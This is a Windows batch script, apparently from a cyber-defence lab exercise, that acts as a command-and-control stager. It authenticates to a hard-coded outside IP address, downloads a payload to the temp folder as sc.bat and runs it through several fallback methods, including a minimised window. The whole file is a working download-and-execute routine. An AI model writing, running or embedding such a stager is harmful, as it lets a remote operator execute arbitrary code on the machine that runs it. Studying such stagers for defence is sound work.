@echo off
setlocal EnableDelayedExpansion
title C2 VirusPracticaAlex - HMAC Stable
color 0A

echo.
echo ╔══════════════════════════════════════════════════════╗
echo ║  🔥 C2 VIRUSPRÁCTICA - HMAC MODE 🔥                  ║
echo ║  Alex Montilla - Ciberdefensa Lab                    ║
echo ╚══════════════════════════════════════════════════════╝
echo.

set "BASE=http://82.29.153.101:8080"
set "FILE=%TEMP%\sc.bat"

echo 🌐 TARGET: %BASE%
echo 📁 OUTPUT: %FILE%
echo.

REM ===== 1. AUTH (NONCE + TOKEN) =====
echo 🔑 [1/3] AUTH...

for /f "tokens=*" %%i in ('curl -s "%BASE%/auth/key"') do (
    set "AUTH=%%i"
    goto :got_auth
)
:got_auth

if not defined AUTH (
    echo    ❌ NO AUTH RESPONSE
    pause
    exit /b 1
)

REM ===== PARSE JSON (mejorado) =====
echo !AUTH! | findstr /i "nonce" > %TEMP%\temp_nonce.txt 2>nul
echo !AUTH! | findstr /i "token" > %TEMP%\temp_token.txt 2>nul

for /f "tokens=2 delims=:," %%i in ('type %TEMP%\temp_nonce.txt') do set "NONCE=%%~i"
for /f "tokens=2 delims=:," %%i in ('type %TEMP%\temp_token.txt') do set "TOKEN=%%~i"

REM Limpiar comillas y espacios
set NONCE=!NONCE:"=!
set NONCE=!NONCE: =!
set TOKEN=!TOKEN:"=!
set TOKEN=!TOKEN: =!

del %TEMP%\temp_nonce.txt %TEMP%\temp_token.txt 2>nul

if not defined NONCE (
    echo    ❌ NONCE ERROR
    echo    RAW: !AUTH!
    pause
    exit /b 1
)

if not defined TOKEN (
    echo    ❌ TOKEN ERROR
    echo    RAW: !AUTH!
    pause
    exit /b 1
)

echo    ✓ NONCE=!NONCE!
echo    ✓ TOKEN=!TOKEN!
echo.

REM ===== 2. PAYLOAD DOWNLOAD =====
echo 📥 [2/3] PAYLOAD...

curl -s --max-time 10 ^
  -H "X-Nonce: !NONCE!" ^
  -H "X-Token: !TOKEN!" ^
  "%BASE%/payload/encrypted" ^
  -o "%FILE%"

if errorlevel 1 (
    echo    ❌ DOWNLOAD FAILED (curl error: !errorlevel!)
    pause
    exit /b 1
)

if not exist "%FILE%" (
    echo    ❌ FILE NOT CREATED
    pause
    exit /b 1
)

for %%F in ("%FILE%") do set FILESIZE=%%~zF
if !FILESIZE! LSS 5 (
    echo    ❌ EMPTY PAYLOAD (!FILESIZE! bytes)
    type "%FILE%"
    pause
    exit /b 1
)

echo    ✓ PAYLOAD: %FILE% (!FILESIZE! bytes)
echo.

REM ===== 3. PREVIEW + EXECUTAR SIEMPRE =====
echo 👁️  [3/3] PREVIEW:
echo    ╔══════
type "%FILE%" | more /e +1 /n 12
echo    ╚══════
echo.

echo ⚡  🚀 EJECUTANDO PAYLOAD en 3s...
echo    Archivo: %FILE%
timeout /t 3 /nobreak >nul

echo    → 🔥 EXECUTANDO: call "%FILE%"
echo.

REM ===== EJECUCIÓN MÚLTIPLES MÉTODOS =====
echo 🔥 MÉTODO 1: call directo
call "%FILE%"
if errorlevel 1 (
    echo ⚠️  call falló, probando cmd /c...
    cmd /c "%FILE%"
)

REM Verificar si el archivo aún existe (puede que se autoelimine)
if exist "%FILE%" (
    echo 🔥 MÉTODO 2: start /min
    start /min cmd /c "%FILE%"
)

REM Esperar un poco para que se ejecute
timeout /t 2 /nobreak >nul

echo.
echo ✅ MISSION COMPLETE ✓
echo 📁 Payload queda para debug: %FILE%
echo.
pause >nul

REM ===== AUTO-CLEANUP OPCIONAL =====
REM choice /c:YN /t 10 /d N /m "Eliminar payload? [Y/N]"
REM if errorlevel 2 del "%FILE%" 2>nul